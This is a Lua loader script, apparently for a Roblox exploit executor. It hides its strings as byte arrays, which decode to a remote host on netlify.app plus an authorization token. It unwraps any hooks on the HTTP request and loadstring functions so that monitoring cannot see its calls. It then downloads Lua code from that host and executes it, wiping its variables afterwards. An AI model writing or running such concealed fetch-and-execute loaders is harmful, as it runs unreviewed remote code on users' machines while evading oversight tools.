local _rawget = rawget
local _type = type
local _pcall = pcall
local _tostring = tostring
local _ipairs = ipairs
local _table_concat = table.concat
local _string_char = string.char
local _string_sub = string.sub

local function _d(t)
	local r = {}
	for i = 1, #t do r[i] = _string_char(t[i]) end
	return _table_concat(r)
end

local function _unwrap(fn)
	if not debug or not debug.getupvalue then return fn end
	local i = 1
	while true do
		local ok, name, val = _pcall(debug.getupvalue, fn, i)
		if not ok or not name then break end
		if _type(val) == "function" and (
			name == "oldReq" or
			name == "oldRequest" or
			name == "oldGet" or
			name == "original" or
			name == "orig"
		) then
			return _unwrap(val)
		end
		i = i + 1
	end
	return fn
end

local _req
do
	local candidates = {}
	if syn and _type(syn) == "table" then
		local sr = _rawget(syn, "request")
		if _type(sr) == "function" then
			candidates[#candidates + 1] = sr
		end
	end
	if http and _type(http) == "table" then
		local hr = _rawget(http, "request")
		if _type(hr) == "function" then
			candidates[#candidates + 1] = hr
		end
	end
	if _type(request) == "function" then
		candidates[#candidates + 1] = request
	end
	if _type(http_request) == "function" then
		candidates[#candidates + 1] = http_request
	end
	for _, fn in _ipairs(candidates) do
		local unwrapped = _unwrap(fn)
		if unwrapped then
			_req = unwrapped
			break
		end
	end
	_req = _req or request
end

local _ls
do
	local ls = loadstring
	_ls = _unwrap(ls) or ls
end

local _tok = _d({64,35,36,95,38,45,43,40,41,47,42,34}) .. _d({39,58,59,33,63,95,49,48,50,57,51,56,52,55,53,54})

local function _buildUrl()
	local proto = _d({104,116,116,112,115})
	local sep = _d({58,47,47})
	local host = _d({115,104,97,100,111,119,120,112,114,111,116,101,99,116,105,111,110,46,110,101,116,108,105,102,121,46,97,112,112})
	local path = _d({47,97,112,105,47,108,111,97,100,101,114})
	return proto .. sep .. host .. path
end

local function _fetch(url)
	assert(_req, "No HTTP request function found")
	local ok, res = _pcall(_req, {
		Url = url,
		Method = _d({71,69,84}),
		Headers = {
			[_d({65,117,116,104,111,114,105,122,97,116,105,111,110})] = _tok,
		},
	})
	if not ok then
		error("Request failed: " .. _tostring(res))
	end
	if not res or not res.Body or res.Body == "" then
		error("Empty response (status: " .. _tostring(res and res.StatusCode or "?") .. ")")
	end
	local trimmed = res.Body:match("^%s*(.-)%s*$")
	if _string_sub(trimmed, 1, 1) == "<" then
		error("Got HTML instead of Lua")
	end
	return res.Body
end

local _url = _buildUrl()
local _body = _fetch(_url)
_url = nil
_tok = nil

local _fn, _err = _ls(_body)
_body = nil

if not _fn then
	error("Compile error: " .. _tostring(_err))
end

local _ok, _rerr = _pcall(_fn)
_fn = nil

if not _ok then
	error("Runtime error: " .. _tostring(_rerr))
end
